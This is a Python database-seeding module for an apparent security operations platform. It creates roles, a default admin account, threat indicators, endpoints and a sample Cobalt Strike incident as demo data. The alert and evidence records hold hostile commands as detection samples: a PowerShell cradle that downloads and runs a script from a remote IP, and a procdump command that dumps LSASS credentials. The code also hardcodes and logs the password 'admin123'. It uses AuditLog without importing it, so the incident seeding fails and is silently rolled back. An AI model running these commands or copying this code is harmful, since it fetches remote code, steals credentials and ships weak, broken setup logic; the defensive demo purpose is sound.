import os
from typing import AsyncGenerator
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker, AsyncSession
from sqlalchemy import select
from loguru import logger
from app.core.config import settings
from app.core.security import get_password_hash
from app.models.models import Base, Role, User, IOCRecord, Endpoint, Alert, Incident, Evidence

# Resolve DB URL with graceful fallback to local SQLite
DB_URL = settings.DATABASE_URL
if not DB_URL:
    db_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "skynet.db"))
    DB_URL = f"sqlite+aiosqlite:///{db_path}"

# SQLite requires specific connect_args for multithreading
connect_args = {"check_same_thread": False} if DB_URL.startswith("sqlite") else {}

engine = create_async_engine(
    DB_URL,
    echo=False,
    future=True,
    connect_args=connect_args
)

AsyncSessionLocal = async_sessionmaker(
    bind=engine,
    class_=AsyncSession,
    expire_on_commit=False,
    autoflush=False
)

async def get_db() -> AsyncGenerator[AsyncSession, None]:
    async with AsyncSessionLocal() as session:
        try:
            yield session
        except Exception:
            await session.rollback()
            raise
        finally:
            await session.close()

async def init_db():
    """Initializes tables, seeds roles, admin user, and sample threat intelligence."""
    logger.info("Initializing database schema...")
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    async with AsyncSessionLocal() as session:
        try:
            # Seed Roles
            roles_data = [
                ("ADMIN", ["*"]),
                ("L1_ANALYST", ["alerts:read", "alerts:write", "incidents:read", "incidents:write", "soar:execute"]),
                ("THREAT_HUNTER", ["alerts:read", "incidents:read", "threatintel:read"])
            ]
            for role_name, perms in roles_data:
                result = await session.execute(select(Role).where(Role.name == role_name))
                if not result.scalars().first():
                    session.add(Role(name=role_name, permissions=perms))
            await session.commit()

            # Seed Admin User
            admin_role_result = await session.execute(select(Role).where(Role.name == "ADMIN"))
            admin_role = admin_role_result.scalars().first()
            if admin_role:
                admin_result = await session.execute(select(User).where(User.username == "admin"))
                if not admin_result.scalars().first():
                    admin_user = User(
                        username="admin",
                        email="admin@skynet.sec",
                        hashed_password=get_password_hash("admin123"),
                        role_id=admin_role.id,
                        status="ACTIVE"
                    )
                    session.add(admin_user)
                    logger.info("Created default administrator: admin / admin123")

            # Seed Sample IOCs
            sample_iocs = [
                ("IP", "185.220.101.5", 98, "Cobalt Strike C2", "AbuseIPDB", ["c2", "tor-exit"]),
                ("IP", "45.154.255.88", 92, "LockBit Ransomware", "VirusTotal", ["ransomware", "botnet"]),
                ("SHA256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", 0, "Clean File", "VirusTotal", ["clean"]),
                ("SHA256", "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", 99, "Mimikatz LSASS Stealer", "VirusTotal", ["trojan", "credential-theft"]),
                ("DOMAIN", "update-microsoft-verify.top", 95, "Phishing / C2", "URLhaus", ["phishing", "c2"])
            ]
            for ioc_type, val, score, family, src, tags in sample_iocs:
                result = await session.execute(select(IOCRecord).where(IOCRecord.ioc_value == val))
                if not result.scalars().first():
                    session.add(IOCRecord(
                        ioc_type=ioc_type,
                        ioc_value=val,
                        threat_score=score,
                        malware_family=family,
                        source=src,
                        tags=tags
                    ))

            # Seed Endpoints Fleet
            endpoints_data = [
                ("SEC-WS-001", "192.168.1.105", "Windows", "11 Pro x64", "Workstation", 24.5, 68.2, 42.0, "ONLINE"),
                ("DC-PRIMARY-01", "192.168.1.10", "Windows", "Server 2022 Datacenter", "Server", 45.2, 82.1, 55.4, "WARNING"),
                ("FIN-LAPTOP-042", "192.168.1.188", "Windows", "11 Enterprise", "Laptop", 88.0, 94.5, 78.2, "COMPROMISED"),
                ("PAYROLL-DB-02", "192.168.2.50", "Ubuntu Linux", "22.04 LTS", "Server", 18.3, 44.0, 62.1, "ONLINE"),
                ("CORP-GATEWAY-FW", "192.168.1.1", "FreeBSD", "pfsense 2.7", "Server", 12.0, 31.5, 20.0, "ONLINE"),
                ("DEV-BUILD-RUNNER", "192.168.3.112", "Debian", "12 Bookworm", "Server", 91.2, 89.0, 84.5, "ONLINE"),
                ("EXEC-MACBOOK-07", "192.168.1.99", "macOS", "Sonoma 14.5", "Laptop", 15.0, 52.0, 35.0, "ONLINE"),
            ]
            for hname, ip, os_n, os_v, dtype, cpu, mem, disk, st in endpoints_data:
                res = await session.execute(select(Endpoint).where(Endpoint.hostname == hname))
                if not res.scalars().first():
                    session.add(Endpoint(
                        hostname=hname,
                        ip_address=ip,
                        os_name=os_n,
                        os_version=os_v,
                        device_type=dtype,
                        cpu_usage=cpu,
                        memory_usage=mem,
                        disk_usage=disk,
                        status=st,
                        agent_version="1.0.0"
                    ))
            await session.commit()

            # Seed Sample Incident with Alerts & Evidence
            inc_res = await session.execute(select(Incident).where(Incident.incident_number == "INC-2026-0001"))
            existing_inc = inc_res.scalars().first()
            if not existing_inc:
                sample_inc = Incident(
                    incident_number="INC-2026-0001",
                    title="Cobalt Strike Beacon Infiltration & Credential Dumping",
                    description="Multiple high-severity detections indicating initial ingress via phishing, followed by PowerShell download of Cobalt Strike beacon and LSASS memory dumping on FIN-LAPTOP-042.",
                    severity="CRITICAL",
                    status="INVESTIGATING",
                    verdict="TRUE_POSITIVE",
                    ai_summary="Autonomous Tier-1 triage identified a multi-stage intrusion on FIN-LAPTOP-042. Attacker successfully executed obfuscated PowerShell to download a known C2 beacon communicating with 185.220.101.5. Procdump executed 4 minutes later against lsass.exe.",
                    ai_root_cause="Phishing attachment payload delivered obfuscated PowerShell script bypassing AMSI, downloading second-stage beacon from remote C2 node.",
                    ai_recommended_action="1. Isolate endpoint FIN-LAPTOP-042 via SOAR containment API immediately.\n2. Update border firewall ACL to drop 185.220.101.5.\n3. Invalidate Kerberos TGT and rotate credentials for affected domain user 'finance_lead'.",
                    mitre_tactics=["Execution", "Credential Access", "Command and Control", "Defense Evasion"],
                    mitre_techniques=["T1059.001", "T1003.001", "T1105", "T1071.001"]
                )
                session.add(sample_inc)
                await session.flush()

                # Seed Associated Alerts
                alerts_data = [
                    (
                        "Cobalt Strike C2 Beacon Communication Detected",
                        "Outbound HTTPS beaconing traffic detected to known malicious C2 IP 185.220.101.5 on port 443 with JARM fingerprint match.",
                        "CRITICAL",
                        "IOC_MATCH",
                        "NEW",
                        "FIN-LAPTOP-042",
                        "192.168.1.188",
                        "T1071.001",
                        {"c2_ip": "185.220.101.5", "port": 443, "interval_sec": 30, "jitter": "15%"}
                    ),
                    (
                        "LSASS Memory Dumping Attempt via Procdump",
                        "Process execution: procdump64.exe -ma lsass.exe out.dmp targeting Local Security Authority Subsystem Service.",
                        "CRITICAL",
                        "SIGMA_RULE",
                        "NEW",
                        "FIN-LAPTOP-042",
                        "192.168.1.188",
                        "T1003.001",
                        {"command_line": "procdump64.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp", "parent_process": "powershell.exe"}
                    ),
                    (
                        "Encoded PowerShell Download Cradle Executed",
                        "Base64 encoded PowerShell execution with Net.WebClient invoking memory-only script execution.",
                        "HIGH",
                        "SIGMA_RULE",
                        "ACKNOWLEDGED",
                        "FIN-LAPTOP-042",
                        "192.168.1.188",
                        "T1059.001",
                        {"script_block": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/stage.ps1')"}
                    ),
                    (
                        "Unusual Anomaly: High Privileged Kerberos Ticket Request",
                        "Abnormal volume of Kerberos ticket requests (AS-REQ) originating from unauthorized subnet during off-hours.",
                        "MEDIUM",
                        "BEHAVIORAL_ANOMALY",
                        "NEW",
                        "DC-PRIMARY-01",
                        "192.168.1.10",
                        "T1078",
                        {"request_count": 142, "account": "svc_sql_admin"}
                    ),
                    (
                        "Suspicious Scheduled Task Created via Schtasks",
                        "Persistence mechanism detected: schtasks /create /tn 'SystemHealthUpdate' /tr 'powershell -enc ...'",
                        "HIGH",
                        "SIGMA_RULE",
                        "NEW",
                        "SEC-WS-001",
                        "192.168.1.105",
                        "T1053.005",
                        {"task_name": "SystemHealthUpdate", "run_as": "SYSTEM"}
                    )
                ]

                for title, desc, sev, src, stat, hname, hip, m_tech, edata in alerts_data:
                    a = Alert(
                        title=title,
                        description=desc,
                        severity=sev,
                        source=src,
                        status=stat,
                        host_name=hname,
                        host_ip=hip,
                        mitre_technique=m_tech,
                        event_data=edata,
                        incident_id=sample_inc.id if hname == "FIN-LAPTOP-042" else None
                    )
                    session.add(a)

                # Seed Evidence for Incident
                ev1 = Evidence(
                    incident_id=sample_inc.id,
                    evidence_type="PROCESS_LOG",
                    raw_payload={
                        "process_name": "powershell.exe",
                        "pid": 4820,
                        "parent_pid": 1104,
                        "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...",
                        "timestamp": "2026-09-25T13:42:10Z"
                    },
                    hash_sha256="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
                    notes="Obfuscated PowerShell invocation launching secondary stage loader."
                )
                ev2 = Evidence(
                    incident_id=sample_inc.id,
                    evidence_type="NETWORK_FLOW",
                    raw_payload={
                        "src_ip": "192.168.1.188",
                        "src_port": 51240,
                        "dst_ip": "185.220.101.5",
                        "dst_port": 443,
                        "proto": "TCP",
                        "bytes_out": 4210,
                        "bytes_in": 128450
                    },
                    hash_sha256=None,
                    notes="Persistent beaconing flow matching Cobalt Strike malleable C2 profile."
                )
                session.add(ev1)
                session.add(ev2)

                # Seed Sample Audit Logs
                sample_audits = [
                    ("SOC AI Agent", "SOAR_ISOLATE_HOST", "CONTAINMENT", "FIN-LAPTOP-042", {"reason": "Active C2 beacon containment recommended by Tier-1 agent"}),
                    ("admin", "LOGIN", "AUTH", "admin", {"client_ip": "127.0.0.1"}),
                    ("SOC AI Agent", "INCIDENT_TRIAGED", "INCIDENT", "INC-2026-0001", {"status": "INVESTIGATING", "verdict": "TRUE_POSITIVE"})
                ]
                for actor, act, rtype, rid, payload in sample_audits:
                    session.add(AuditLog(
                        actor=actor,
                        action=act,
                        resource_type=rtype,
                        resource_id=rid,
                        payload=payload,
                        client_ip="127.0.0.1"
                    ))

            await session.commit()
            logger.info("Database initialization and seed records completed successfully.")
        except Exception as e:
            logger.error(f"Database initialization error: {e}")
            await session.rollback()
